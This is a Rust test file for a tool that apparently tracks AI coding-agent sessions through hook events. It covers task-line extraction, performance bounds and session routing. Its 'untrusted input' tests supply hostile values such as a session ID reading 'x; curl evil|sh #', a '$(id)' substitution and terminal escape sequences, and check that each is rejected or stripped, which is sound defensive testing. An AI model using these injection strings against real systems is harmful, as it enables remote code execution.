        "user-prompt-submit",
        prompt("</environment_context>\nand this").as_bytes(),
        env("w2:p3"),
        at(1),
    )
    .unwrap();
    assert_eq!(load(&s, "claude", "w2:p3").task, "and this");
}

/// This runs inside `UserPromptSubmit`, before the state transition is saved.
/// Searching for a close from every opening made it quadratic, so a prompt of
/// unmatched tag lines could stall the agent's own hook.
#[test]
fn a_prompt_of_many_unmatched_tags_does_not_stall_the_hook() {
    let (_d, s) = store();
    let mut body = String::new();
    for i in 0..20_000 {
        body.push_str(&format!("<item{i}>\n"));
    }
    body.push_str("and now the actual instruction");
    let payload = format!(r#"{{"session_id":"s","prompt":{body:?}}}"#);

    let began = std::time::Instant::now();
    claude::run(
        &s,
        "user-prompt-submit",
        payload.as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    let took = began.elapsed();

    assert_eq!(
        load(&s, "claude", "w2:p3").task,
        "and now the actual instruction"
    );
    assert!(
        took < std::time::Duration::from_secs(2),
        "20k unmatched tags took {took:?} — the scan is not linear"
    );
}

/// The other shape that goes quadratic: not unmatched tags, but deeply nested
/// matched ones around a single sentence. Indexing the closes does not help
/// here — every opening still walked its own interior looking for prose, and
/// `N` nested blocks walk the same lines `N` times.
#[test]
fn a_deeply_nested_prompt_does_not_stall_the_hook() {
    let (_d, s) = store();
    const N: usize = 20_000;
    let mut body = String::new();
    for i in 0..N {
        body.push_str(&format!("<w{i}>\n"));
    }
    body.push_str("the instruction in the middle\n");
    for i in (0..N).rev() {
        body.push_str(&format!("</w{i}>\n"));
    }
    let payload = format!(r#"{{"session_id":"s","prompt":{body:?}}}"#);

    let began = std::time::Instant::now();
    claude::run(
        &s,
        "user-prompt-submit",
        payload.as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    let took = began.elapsed();

    // Every wrapper holds prose, so none of them is context — the sentence is
    // the instruction.
    assert_eq!(
        load(&s, "claude", "w2:p3").task,
        "the instruction in the middle"
    );
    assert!(
        took < std::time::Duration::from_secs(2),
        "{N} nested blocks took {took:?} — the interior scan is not linear"
    );
}

/// The contract, stated in one place: a line carrying no content is a wrapper
/// and is skipped; a line carrying any content is never skipped.
///
/// The cost is deliberate and is the second half of this test. A machine's
/// `<cwd>/repo</cwd>` and a person's `<step>refactor authentication</step>` are
/// the same line structurally — an element wrapping text — so no rule can
/// suppress one without suppressing the other. Showing metadata is a bad row
/// that the next real prompt replaces; hiding an instruction leaves the row
/// reporting the *previous* task while the agent works on something else.
#[test]
fn a_wrapper_is_skipped_and_content_never_is() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);
    let mut n = 0;
    let mut task_for = |text: &str| {
        n += 1;
        claude::run(
            &s,
            "user-prompt-submit",
            prompt(text).as_bytes(),
            env("w2:p3"),
            at(n),
        )
        .unwrap();
        load(&s, "claude", "w2:p3").task
    };

    // Wrappers, skipped: bare, attributed, self-closing, and closing.
    assert_eq!(task_for("<instructions>\nrefactor auth"), "refactor auth");
    assert_eq!(
        task_for("<environment_context source=\"harness\">\nrefactor auth"),
        "refactor auth",
        "attributes do not make a wrapper unrecognizable"
    );
    assert_eq!(task_for("<br/>\nrefactor auth"), "refactor auth");
    assert_eq!(
        task_for("<task-notification />\nrefactor auth"),
        "refactor auth",
        "the spaced self-closing form is the conventional one"
    );
    assert_eq!(task_for("</instructions>\nrefactor auth"), "refactor auth");

    // Content, never skipped — including content that is plainly a machine's.
    assert_eq!(
        task_for("<instructions>\n<step>refactor auth</step>\n</instructions>\nalso add tests"),
        "refactor auth",
        "an inline element holds somebody's words, and they win over the trailing line"
    );
    assert_eq!(
        task_for("<environment_context>\n<cwd>/repo</cwd>\n</environment_context>\nplease review"),
        "/repo",
        "the accepted cost: metadata on the row, visible and self-correcting"
    );

    // A line that is not a tag at all, whatever its brackets.
    assert_eq!(task_for("<not a tag>"), "<not a tag>");
    assert_eq!(task_for("<>"), "<>");
    assert_eq!(
        task_for("explain Vec<String> to me"),
        "explain Vec<String> to me"
    );
}

/// A prompt of nothing but wrappers has nothing to show, so the real
/// instruction keeps the row rather than being replaced by a wake-up.
#[test]
fn a_prompt_of_only_wrappers_leaves_the_task_alone() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("fix the card refresh").as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    for wake in [
        "<task-notification>",
        "<task-notification />",
        "<task-notification/>",
        "<task-notification>\n\n<resume>",
        "<instructions>\n</instructions>",
    ] {
        claude::run(
            &s,
            "user-prompt-submit",
            prompt(wake).as_bytes(),
            env("w2:p3"),
            at(1),
        )
        .unwrap();
        assert_eq!(
            load(&s, "claude", "w2:p3").task,
            "fix the card refresh",
            "{wake:?}"
        );
    }
}

/// An element wrapping nothing carries no prose, so skipping it discards no
/// instruction — which is what separates it from `<step>…</step>`.
///
/// It needed saying separately because the line has two `>` in it, so the
/// tag-only test does not reach it, and the display unwrap returned either
/// nothing or a cell of spaces.
#[test]
fn an_empty_element_is_a_wrapper_too() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);
    let mut n = 0;
    let mut task_for = |text: &str| {
        n += 1;
        claude::run(
            &s,
            "user-prompt-submit",
            prompt(text).as_bytes(),
            env("w2:p3"),
            at(n),
        )
        .unwrap();
        load(&s, "claude", "w2:p3").task
    };

    assert_eq!(
        task_for("<metadata></metadata>\nrefactor authentication"),
        "refactor authentication"
    );
    assert_eq!(
        task_for("<metadata>   </metadata>\nrefactor authentication"),
        "refactor authentication",
        "whitespace is not content either — this recorded a cell of spaces"
    );
    assert_eq!(
        task_for("<metadata attr=\"x\"></metadata>\nrefactor authentication"),
        "refactor authentication"
    );
    // And the line that separates them: one character of content and it stays.
    assert_eq!(
        task_for("<step>refactor authentication</step>\nalso add tests"),
        "refactor authentication"
    );
}

/// What a prompt leaves in the TASK column: the handles it must not show, the
/// bound it is cut at, and the whole rule against a second implementation.
mod task_line {
    use super::*;

    /// The 17-character lowercase hex handle a subagent is dispatched with.
    const TASK_ID: &str = "a1b2c3d4e5f607182";

    /// The prompt a test starts from, so "nothing worth showing" is visible as
    /// "the row did not move".
    const SENTINEL: &str = "fix the card refresh";

    /// Submits `text` as a prompt and hands back what the row says afterwards.
    fn task_for(s: &Store, n: i64, text: &str) -> String {
        let stdin = format!(r#"{{"session_id":"s","prompt":{text:?}}}"#);
        claude::run(
            s,
            "user-prompt-submit",
            stdin.as_bytes(),
            env("w2:p3"),
            at(n),
        )
        .unwrap();
        load(s, "claude", "w2:p3").task
    }

    /// A subagent's task ID is a handle, not a task.
    ///
    /// A prompt can arrive as nothing but the 17-character hex ID a Claude
    /// subagent is known by, and the row would then read `a1b2c3d4e5f607182` —
    /// seventeen characters that tell a reader nothing, in place of the
    /// instruction they replaced. `Agent::task_shown` has the display's half of
    /// this, for the records written before the rule existed. The wrapped form is
    /// the same handle: unwrapping `<task>…</task>` for display must not smuggle
    /// it back in after the line was let through.
    #[test]
    fn a_subagent_task_id_does_not_become_the_task() {
        let (_d, s) = store();
        assert_eq!(task_for(&s, 0, SENTINEL), SENTINEL);
        assert_eq!(
            task_for(&s, 1, &format!("{TASK_ID}\nfix the login form")),
            "fix the login form",
            "the handle costs its line, and the instruction under it still counts"
        );
        assert_eq!(
            task_for(
                &s,
                2,
                &format!("<task>{TASK_ID}</task>\nfix the login form")
            ),
            "fix the login form",
            "unwrapping for display must not smuggle the handle back in"
        );
        assert_eq!(
            task_for(&s, 3, TASK_ID),
            "fix the login form",
            "a prompt that is nothing but a handle leaves the row alone"
        );
    }

    /// And only an exact handle is declined, because everything else in that
    /// shape is somebody's words. Seventeen lowercase hex characters is a
    /// narrow rule on purpose: one character more, one fewer, one in capitals
    /// or one outside hex and the line is a task again.
    #[test]
    fn a_near_miss_of_a_task_id_is_still_a_task() {
        let (_d, s) = store();
        for (n, text) in [
            "a1b2c3d4e5f60718",
            "a1b2c3d4e5f6071823",
            "A1B2C3D4E5F607182",
            "g1b2c3d4e5f607182",
        ]
        .into_iter()
        .enumerate()
        {
            assert_eq!(task_for(&s, n as i64, text), text, "{text:?}");
        }
    }

    /// The column is bounded at 200 characters, counted in characters.
    ///
    /// A prompt can run to thousands of characters and a record is read far
    /// more often than it is written, so the bound is the write's job. Counting
    /// bytes would cut a Korean prompt through the middle of a character and
    /// write text into the store that is not text.
    #[test]
    fn a_long_prompt_is_cut_at_two_hundred_characters() {
        let (_d, s) = store();
        let exactly = "a".repeat(200);
        assert_eq!(
            task_for(&s, 0, &exactly),
            exactly,
            "200 characters is not over the line"
        );
        assert_eq!(task_for(&s, 1, &"b".repeat(201)), "b".repeat(200));

        let got = task_for(&s, 2, &"한".repeat(250));
        assert_eq!(got, "한".repeat(200));
        assert_eq!(got.chars().count(), 200);
        assert_eq!(
            got.len(),
            600,
            "cut by character, so the row is 200 characters and 600 bytes"
        );
    }

    /// Seventeen lowercase hex digits, spelled out here rather than asked of
    /// `tower_state::is_task_id` — the whole point of the scan below is to be a
    /// second opinion, and one that calls the predicate it is checking agrees
    /// with it by construction.
    fn scanned_task_id(s: &str) -> bool {
        s.len() == 17
            && s.bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
    }

    /// `<name …>text</name>` and nothing else on the line, unwrapped to `text`.
    ///
    /// `None` for anything else — a bare tag, two elements, text outside the
    /// tags, a `<` or `>` in the middle. Written out here for the same reason as
    /// [`scanned_task_id`].
    fn scanned_element_text(line: &str) -> Option<&str> {
        let (head, after) = line.strip_prefix('<')?.split_once('>')?;
        let name = head.split([' ', '\t']).next()?;
        if name.is_empty() || name.starts_with('/') || name.ends_with('/') {
            return None;
        }
        let inner = after.strip_suffix(&format!("</{name}>"))?;
        (!inner.contains(['<', '>'])).then_some(inner)
    }

    /// A line that is a tag and nothing a person typed: `<name>`, `</name>`,
    /// `<name/>`, `<name attr="v">`, or an element wrapping only whitespace.
    ///
    /// Written out here for the same reason as [`scanned_task_id`]. Whatever
    /// follows the name has to be attributes or the self-closing slash, so
    /// `<not a tag>` is somebody's prompt rather than a wrapper.
    fn scanned_machine_tag(line: &str) -> bool {
        if scanned_element_text(line).is_some_and(|t| t.trim().is_empty()) {
            return true;
        }
        let Some(body) = line.strip_prefix('<').and_then(|b| b.strip_suffix('>')) else {
            return false;
        };
        if body.contains('>') {
            return false;
        }
        let body = body.strip_prefix('/').unwrap_or(body);
        let body = body.strip_suffix('/').unwrap_or(body);
        let (name, attrs) = match body.find(char::is_whitespace) {
            Some(i) => (&body[..i], body[i..].trim()),
            None => (body, ""),
        };
        !name.is_empty()
            && name.starts_with(|c: char| c.is_ascii_alphabetic())
            && name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':'))
            && (attrs.is_empty() || attrs == "/" || attrs.contains('='))
    }

    /// The rule written a second time, as a plain scan: keep the first line
    /// that is neither blank, nor a bare wrapper, nor a handle; show it
    /// unwrapped; cut it at 200 characters.
    ///
    /// Every check it makes is its own ([`scanned_task_id`],
    /// [`scanned_element_text`], [`scanned_machine_tag`]). Calling
    /// `tower_state`'s predicates here would leave the cross-check able to see
    /// only a change to `task_line`'s loop — the three shapes it turns on, which
    /// are the part with the interesting edges, would be agreed on by definition.
    fn scanned_task(prompt: &str) -> Option<String> {
        for raw in prompt.split('\n') {
            let line = raw.trim();
            if line.is_empty() || scanned_machine_tag(line) {
                continue;
            }
            let shown = match scanned_element_text(line) {
                Some(inner) if !inner.trim().is_empty() => inner.trim(),
                _ => line,
            };
            if scanned_task_id(line) || scanned_task_id(shown) {
                continue;
            }
            let chars: Vec<char> = shown.chars().collect();
            return Some(chars[..chars.len().min(200)].iter().collect());
        }
        None
    }

    /// xorshift64*: small, fast, and the same sequence on every machine.
    struct Rng(tower_testrng::Rng);

    impl Rng {
        fn new(seed: u64) -> Rng {
            Rng(tower_testrng::Rng::new(seed))
        }

        fn below(&mut self, n: usize) -> usize {
            self.0.below(n)
        }

        /// One line out of the shapes a prompt really arrives in.
        fn line(&mut self) -> String {
            const LINES: &[&str] = &[
                "",
                "   ",
                "<task-notification>",
                "<task-notification />",
                "<instructions>",
                "</instructions>",
                "<metadata></metadata>",
                TASK_ID,
                "<task>a1b2c3d4e5f607182</task>",
                "<step>refactor auth</step>",
                "<cwd>/repo</cwd>",
                "fix the login form",
                "로그인 폼 다크모드로 바꿔줘",
                "explain Vec<String> to me",
                "<not a tag>",
                "a1b2c3d4e5f60718",
                "A1B2C3D4E5F607182",
            ];
            // One line in ten is long enough to be cut, which is where the
            // character bound and the byte length disagree.
            if self.below(10) == 0 {
                return "긴 지시 ".repeat(60);
            }
            LINES[self.below(LINES.len())].to_string()
        }

        fn prompt(&mut self) -> String {
            (0..1 + self.below(5))
                .map(|_| self.line())
                .collect::<Vec<_>>()
                .join("\n")
        }
    }

    /// Generated prompts against the plain scan, including the prompts that
    /// leave the row where it was — which is why the expectation is carried
    /// forward rather than recomputed: a prompt with nothing to show has to
    /// leave whatever the last one wrote.
    ///
    /// Hand-rolled rather than a property framework: the generator is seeded, so
    /// a failure replays exactly and nothing is added to the build.
    #[test]
    fn a_generated_prompt_leaves_the_task_a_plain_scan_would() {
        let (_d, s) = store();
        let mut rng = Rng::new(0x7A5C);
        let mut want = task_for(&s, 0, SENTINEL);
        assert_eq!(want, SENTINEL);
        for n in 1..150 {
            let prompt = rng.prompt();
            want = scanned_task(&prompt).unwrap_or(want);
            assert_eq!(task_for(&s, n, &prompt), want, "{prompt:?}");
        }
    }
}

// ---------------------------------------------------------------- opencode

const OC_SID: &str = "ses_f2faf319bffePHplqq5y5vQn6X";

fn oc(s: &Store, event: &str, body: &str, mins: i64) {
    opencode::run(s, event, body.as_bytes(), env("w2:p7"), at(mins)).unwrap();
}

/// A turn through the plugin: the prompt starts it and names the task, a
/// permission request holds it with the question, the answer resumes it, and
/// `session.idle` finishes it.
#[test]
fn an_opencode_turn_moves_through_the_plugin_events() {
    let (_d, s) = store();
    oc(
        &s,
        "user-prompt-submit",
        &format!(
            r#"{{"session_id":"{OC_SID}","prompt":"Fix the login bug\nand add a test","model":"qwen3.8-flash"}}"#
        ),
        0,
    );
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::Working);
    assert_eq!(a.task, "Fix the login bug");
    assert_eq!(a.session_id, OC_SID);
    assert_eq!(a.model, "qwen3.8-flash");
    assert_eq!(a.work_seq, 1, "a prompt is a turn");

    oc(&s, "notification", r#"{"message":"bash: ls -la"}"#, 1);
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::Waiting);
    assert_eq!(a.ask, "bash: ls -la");

    oc(&s, "resume", "{}", 2);
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::Working);
    assert!(a.ask.is_empty(), "the answer clears the question");
    assert_eq!(a.work_seq, 1, "an answer is the same turn");

    oc(&s, "stop", "{}", 3);
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::DoneUnread);
    assert_eq!(a.task, "Fix the login bug", "the task outlives the turn");
}

/// A reply that lands after the turn ended leaves the finished, unread
/// session alone.
#[test]
fn a_late_opencode_reply_does_not_reopen_a_finished_turn() {
    let (_d, s) = store();
    oc(&s, "user-prompt-submit", r#"{"prompt":"go"}"#, 0);
    oc(&s, "stop", "{}", 1);
    oc(&s, "resume", "{}", 2);
    assert_eq!(load(&s, "opencode", "w2:p7").state, AgentState::DoneUnread);
}

/// `usage` records the context and the window without moving the state, and
/// a report missing one keeps the one already known.
#[test]
fn opencode_usage_records_the_context_without_moving_the_state() {
    let (_d, s) = store();
    oc(&s, "user-prompt-submit", r#"{"prompt":"go"}"#, 0);
    oc(
        &s,
        "usage",
        r#"{"model":"qwen3.8-flash","context_tokens":12485,"context_window":131072}"#,
        1,
    );
    oc(&s, "usage", r#"{"context_tokens":20000}"#, 2);
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::Working);
    assert_eq!(a.ctx_tokens, 20000);
    assert_eq!(a.ctx_window, 131072, "the window is kept");
    assert_eq!(a.model, "qwen3.8-flash");
}

/// The opencode hook guards its pane like the others: outside herdr it
/// writes nothing, and an unknown event writes nothing.
#[test]
fn an_opencode_hook_outside_herdr_or_for_an_unknown_event_writes_nothing() {
    let (_d, s) = store();
    opencode::run(&s, "stop", "{}".as_bytes(), env(""), at(0)).unwrap();
    oc(&s, "session.compacted", "{}", 0);
    assert!(s.list().unwrap().is_empty());
}

/// A failed turn reads ERR with its reason, the idle that follows keeps it,
/// and the next prompt clears it.
#[test]
fn an_opencode_error_stays_until_the_next_prompt() {
    let (_d, s) = store();
    oc(&s, "user-prompt-submit", r#"{"prompt":"go"}"#, 0);
    oc(
        &s,
        "error",
        r#"{"message":"APIError: connection refused"}"#,
        1,
    );
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::Error);
    assert_eq!(a.ask, "APIError: connection refused");

    oc(&s, "stop", "{}", 2);
    assert_eq!(load(&s, "opencode", "w2:p7").state, AgentState::Error);

    oc(&s, "user-prompt-submit", r#"{"prompt":"again"}"#, 3);
    let a = load(&s, "opencode", "w2:p7");
    assert_eq!(a.state, AgentState::Working);
    assert!(a.ask.is_empty());
}

/// A codex compaction mid-turn sends SessionStart with source `compact`; the
/// running turn stays WORKING. A real start still settles the row to IDLE.
#[test]
fn a_codex_compaction_keeps_the_turn() {
    let (_d, s) = store();
    let e = env("w2:p8");
    codex::run(
        &s,
        "user-prompt-submit",
        r#"{"session_id":"x"}"#.as_bytes(),
        &e,
        at(0),
    )
    .unwrap();
    codex::run(
        &s,
        "session-start",
        r#"{"session_id":"x","source":"compact"}"#.as_bytes(),
        &e,
        at(1),
    )
    .unwrap();
    let a = load(&s, "codex", "w2:p8");
    assert_eq!(a.state, AgentState::Working);
    assert_eq!(a.work_seq, 1);

    codex::run(
        &s,
        "session-start",
        r#"{"session_id":"y","source":"startup"}"#.as_bytes(),
        &e,
        at(2),
    )
    .unwrap();
    let a = load(&s, "codex", "w2:p8");
    assert_eq!(a.state, AgentState::Idle);
    assert_eq!(a.session_id, "y");
}

// ---------------------------------------------------------------- untrusted input

/// The stored-command attack from #28: a session ID that is a shell command is
/// dropped by every vendor's hook, and a valid ID the record already had
/// survives it rather than being wiped.
#[test]
fn a_session_id_that_is_a_shell_command_is_never_stored() {
    let evil = r#"{"session_id":"x; curl evil|sh #","conversationId":"x; curl evil|sh #"}"#;
    let good = r#"{"session_id":"ses_ok-1","conversationId":"ses_ok-1"}"#;
    type Run = fn(
        &Store,
        &str,
        &[u8],
        &dyn Fn(&str) -> Option<String>,
        OffsetDateTime,
    ) -> std::io::Result<Option<tower_hook::Transition>>;
    let vendors: [(&str, Run); 4] = [
        ("claude", |s, e, b, v, t| claude::run(s, e, b, v, t)),
        ("codex", |s, e, b, v, t| codex::run(s, e, b, v, t)),
        ("gemini", |s, e, b, v, t| gemini::run(s, e, b, v, t)),
        ("opencode", |s, e, b, v, t| opencode::run(s, e, b, v, t)),
    ];
    for (kind, run) in vendors {
        let (_d, s) = store();
        let e = env("w2:p9");
        run(&s, "stop", evil.as_bytes(), &e, at(0)).unwrap();
        assert_eq!(load(&s, kind, "w2:p9").session_id, "", "{kind}: stored");
        run(&s, "stop", good.as_bytes(), &e, at(1)).unwrap();
        run(&s, "stop", evil.as_bytes(), &e, at(2)).unwrap();
        assert_eq!(
            load(&s, kind, "w2:p9").session_id,
            "ses_ok-1",
            "{kind}: the valid ID was replaced"
        );
    }
}

/// The compaction path keeps the ID through its own branch; it is held to the
/// same check.
#[test]
fn a_compaction_does_not_store_an_invalid_session_id_either() {
    let (_d, s) = store();
    let body = br#"{"session_id":"$(id)","source":"compact"}"#;
    claude::run(&s, "session-start", &body[..], env("w2:p9"), at(0)).unwrap();
    codex::run(&s, "session-start", &body[..], env("w2:p9"), at(0)).unwrap();
    assert_eq!(load(&s, "claude", "w2:p9").session_id, "");
    assert_eq!(load(&s, "codex", "w2:p9").session_id, "");
}

/// A question or a task carrying terminal escapes is stored without them —
/// OSC 52 and a title change reach the record as plain text, and whitespace
/// controls become spaces.
#[test]
fn control_characters_never_reach_the_stored_task_or_question() {
    let (_d, s) = store();
    let ask = r#"{"session_id":"s","message":"allow\u001b]52;c;ZXZpbA==\u0007 rm\nnow?"}"#;
    claude::run(&s, "notification", ask.as_bytes(), env("w2:p9"), at(0)).unwrap();
    assert_eq!(
        load(&s, "claude", "w2:p9").ask,
        "allow]52;c;ZXZpbA== rm now?"
    );

    let prompt = r#"{"session_id":"ses_1","prompt":"fix\u001b]0;pwned\u0007 it\u009b"}"#;
    opencode::run(
        &s,
        "user-prompt-submit",
        prompt.as_bytes(),
        env("w2:p8"),
        at(1),
    )
    .unwrap();
    assert_eq!(load(&s, "opencode", "w2:p8").task, "fix]0;pwned it");

    let err = r#"{"session_id":"ses_1","message":"\u001b[2Jboom"}"#;
    opencode::run(&s, "error", err.as_bytes(), env("w2:p8"), at(2)).unwrap();
    assert_eq!(load(&s, "opencode", "w2:p8").ask, "[2Jboom");
}

// ---------------------------------------------------------------- codex routing (#45)

/// A codex record as the scanner leaves it: live in `pane`, in `cwd`.
fn codex_row(s: &Store, pane: &str, cwd: &str, session: &str, state: AgentState) {
    let mut a = Agent::new(id_for_pane("codex", pane), "codex", at(0));
    a.pane.pane_id = pane.to_string();
    a.cwd = cwd.to_string();
    a.session_id = session.to_string();
    a.state = state;
    s.save(&a).unwrap();
}

/// codex's shared app-server daemon ran every session's hooks with the
/// environment of the pane that first started it — the tower's long-closed
/// dock pane. The hook must follow the session, not that stale pane, and must
/// never write into the DEAD record it names.
#[test]
fn a_codex_hook_from_a_stale_pane_follows_its_session() {
    let (_d, s) = store();
    codex_row(&s, "w3C:p1", "/w/old", "", AgentState::Dead);
    codex_row(&s, "w2:pB5", "/w/i-2919", "sess-live", AgentState::Idle);
    let body = r#"{"session_id":"sess-live","cwd":"/w/i-2919"}"#;
    codex::run(
        &s,
        "user-prompt-submit",
        body.as_bytes(),
        env("w3C:p1"),
        at(1),
    )
    .unwrap();

    assert_eq!(load(&s, "codex", "w2:pB5").state, AgentState::Working);
    let dead = load(&s, "codex", "w3C:p1");
    assert_eq!(dead.state, AgentState::Dead, "the dead row is left alone");
    assert_eq!(
        dead.session_id, "",
        "and does not take the live session's id"
    );
}

#[test]
fn a_codex_hook_after_a_pane_move_updates_the_existing_record() {
    let (_d, s) = store();
    codex_row(&s, "w2:p1", "/w/proj", "sess-live", AgentState::Waiting);
    let mut moved = load(&s, "codex", "w2:p1");
    moved.pane.pane_id = "w7:p3".into();
    moved.pane.workspace_id = "w7".into();
    moved.task = "keep task".into();
    s.save(&moved).unwrap();

    let body = r#"{"session_id":"sess-live","cwd":"/w/proj"}"#;
    codex::run(
        &s,
        "user-prompt-submit",
        body.as_bytes(),
        env("w2:p1"),
        at(1),
    )
    .unwrap();

    let records = s.list().unwrap();
    assert_eq!(records.len(), 1);
    assert_eq!(records[0].id, "codex-w2:p1");
    assert_eq!(records[0].pane.pane_id, "w7:p3");
    assert_eq!(records[0].state, AgentState::Working);
    assert_eq!(records[0].task, "keep task");
    assert_eq!(records[0].work_seq, 1);
}

#[test]
fn a_new_agent_hook_at_a_reused_id_cannot_overwrite_the_moved_agent() {
    let (_d, s) = store();
    codex_row(&s, "w2:p1", "/w/proj", "old-session", AgentState::Waiting);
    let mut moved = load(&s, "codex", "w2:p1");
    moved.pane.pane_id = "w7:p3".into();
    moved.task = "old task".into();
    s.save(&moved).unwrap();

    let body = br#"{"session_id":"new-session","cwd":"/w/proj"}"#;
    codex::run(&s, "user-prompt-submit", &body[..], env("w2:p1"), at(1)).unwrap();
    let old = s.load("codex-w2:p1").unwrap();
    assert_eq!(old.pane.pane_id, "w7:p3");
    assert_eq!(old.session_id, "old-session");
    assert_eq!(old.task, "old task");
    assert_eq!(old.state, AgentState::Waiting);
    let new = s.load("codex-w2:p1~1").unwrap();
    assert_eq!(new.pane.pane_id, "w2:p1");
    assert_eq!(new.session_id, "new-session");
    assert_eq!(new.state, AgentState::Working);

    let panes: Vec<herdrx::Pane> = serde_json::from_value(serde_json::json!([
        {"pane_id":"w2:p1", "workspace_id":"w2", "tab_id":"w2:t1", "terminal_id":"new-terminal", "agent":"codex"},
        {"pane_id":"w7:p3", "workspace_id":"w7", "tab_id":"w7:t1", "terminal_id":"old-terminal", "agent":"codex"}
    ]))
    .unwrap();
    let mut old = s.load("codex-w2:p1").unwrap();
    old.pane.terminal_id = "old-terminal".into();
    s.save(&old).unwrap();
    tower_scan::sync(&s, &panes, &HashMap::new(), at(2)).unwrap();
    assert_eq!(s.list().unwrap().len(), 2);
    assert_eq!(s.load("codex-w2:p1").unwrap().task, "old task");
    assert_eq!(s.load("codex-w2:p1~1").unwrap().session_id, "new-session");
}

/// With no row holding the session yet, the one live codex without an id in
/// the payload's folder is the one — and it learns its session id.
#[test]
fn a_codex_hook_from_a_stale_pane_finds_the_one_row_in_its_folder() {
    let (_d, s) = store();
    codex_row(&s, "w3C:p1", "/w/old", "", AgentState::Dead);
    codex_row(&s, "w2:pB4", "/w/i-2911", "", AgentState::Idle);
    codex_row(&s, "w7:p1W", "/w/other", "", AgentState::Idle);
    let body = r#"{"session_id":"sess-new","cwd":"/w/i-2911"}"#;
    codex::run(
        &s,
        "permission-request",
        body.as_bytes(),
        env("w3C:p1"),
        at(1),
    )
    .unwrap();

    let a = load(&s, "codex", "w2:pB4");
    assert_eq!(a.state, AgentState::Waiting);
    assert_eq!(a.session_id, "sess-new");
    assert_eq!(load(&s, "codex", "w7:p1W").state, AgentState::Idle);
    assert_eq!(load(&s, "codex", "w3C:p1").state, AgentState::Dead);
}

/// Two id-less codex rows in the payload's folder cannot be told apart, and a
/// stale environment pane is DEAD: nothing is written anywhere.
#[test]
fn an_ambiguous_codex_hook_writes_nothing() {
    let (_d, s) = store();
    codex_row(&s, "w3C:p1", "/w/old", "", AgentState::Dead);
    codex_row(&s, "w2:p1", "/w/same", "", AgentState::Idle);
    codex_row(&s, "w2:p2", "/w/same", "", AgentState::Idle);
    let body = r#"{"session_id":"sess-x","cwd":"/w/same"}"#;
    let t = codex::run(&s, "stop", body.as_bytes(), env("w3C:p1"), at(1)).unwrap();
    assert!(t.is_none());
    for pane in ["w2:p1", "w2:p2"] {
        let a = load(&s, "codex", pane);
        assert_eq!(a.state, AgentState::Idle, "{pane}");
        assert_eq!(a.session_id, "", "{pane}");
    }
    assert_eq!(load(&s, "codex", "w3C:p1").state, AgentState::Dead);
}

/// A live row that holds another session is not overwritten by a hook whose
/// session belongs nowhere else either.
#[test]
fn a_codex_hook_does_not_take_over_another_sessions_row() {
    let (_d, s) = store();
    codex_row(&s, "w2:p9", "/w/proj", "sess-a", AgentState::Idle);
    let body = r#"{"session_id":"sess-b","cwd":"/elsewhere"}"#;
    let t = codex::run(&s, "stop", body.as_bytes(), env("w2:p9"), at(1)).unwrap();
    assert!(t.is_none());
    let a = load(&s, "codex", "w2:p9");
    assert_eq!(a.session_id, "sess-a");
    assert_eq!(a.state, AgentState::Idle);
}

/// The ordinary case is unchanged: the environment's pane, live or not yet
/// recorded, gets the hook.
#[test]
fn a_codex_hook_in_its_own_pane_is_recorded_there() {
    let (_d, s) = store();
    let body = r#"{"session_id":"sess-1","cwd":"/w/proj"}"#;
    codex::run(&s, "session-start", body.as_bytes(), env("w2:p9"), at(0)).unwrap();
    codex::run(
        &s,
        "user-prompt-submit",
        body.as_bytes(),
        env("w2:p9"),
        at(1),
    )
    .unwrap();
    let a = load(&s, "codex", "w2:p9");
    assert_eq!(a.session_id, "sess-1");
    assert_eq!(a.state, AgentState::Working);
}

// ---------------------------------------------------------------- recycled slots

/// A hook that reaches a dead record before the scanner does, from a different
/// conversation, is a new agent in a recycled slot: nothing of the previous
/// conversation carries over — its task, its session, its turn count — and the
/// record is born afresh, so a dispatch board never reads this agent's turns as
/// progress on the previous agent's item.
#[test]
fn a_hook_over_a_dead_record_starts_a_new_one() {
    let (_d, s) = store();
    let mut old = Agent::new(id_for_pane("claude", "w1:p1"), "claude", at(0));
    old.pane.pane_id = "w1:p1".into();
    old.state = AgentState::Dead;
    old.task = "the previous agent's task".into();
    old.session_id = "old-session".into();
    old.work_seq = 9;
    s.save(&old).unwrap();

    claude::run(
        &s,
        "user-prompt-submit",
        CLAUDE_IN.as_bytes(),
        env("w1:p1"),
        at(30),
    )
    .unwrap();

    let a = load(&s, "claude", "w1:p1");
    assert_eq!(a.born_at, Some(at(30)));
    assert_ne!(a.task, "the previous agent's task");
    assert_eq!(a.session_id, "10ec8033-ca55");
    assert!(
        a.work_seq <= 1,
        "counted from zero, not from 9: {}",
        a.work_seq
    );
}

/// The scanner can mark a live agent dead when one listing misses its pane. A
/// hook from the same conversation then revives the record as it was — the
/// running agent's task and turn count are not wiped.
#[test]
fn a_hook_from_the_same_conversation_revives_a_dead_record() {
    let (_d, s) = store();
    let mut same = Agent::new(id_for_pane("claude", "w1:p1"), "claude", at(0));
    same.pane.pane_id = "w1:p1".into();
    same.state = AgentState::Dead;
    same.task = "still running".into();
    same.session_id = "10ec8033-ca55".into();
    same.work_seq = 9;
    s.save(&same).unwrap();

    claude::run(
        &s,
        "post-tool-use",
        CLAUDE_IN.as_bytes(),
        env("w1:p1"),
        at(30),
    )
    .unwrap();

    let a = load(&s, "claude", "w1:p1");
    assert_eq!(a.born_at, Some(at(0)));
    assert_eq!(a.task, "still running");
    assert_eq!(a.work_seq, 9);
}

/// Without a session id in the payload there is no evidence either way: the
